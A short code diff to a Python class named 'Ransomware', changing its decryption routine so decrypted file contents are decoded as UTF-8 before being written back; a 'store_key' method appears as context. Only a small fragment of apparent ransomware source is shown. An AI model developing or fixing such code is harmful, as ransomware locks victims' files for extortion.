@@ -146,7 +146,7 @@ class Ransomware:
 					# DECRYPT IT!!!!
 					decrypted = self.decrypt_it(file, file_content)
 					# --> write decrypted data back into file
-					f.write(decrypted)
+					f.write(decrypted.decode('utf8'))
 
 
 	def store_key(self):
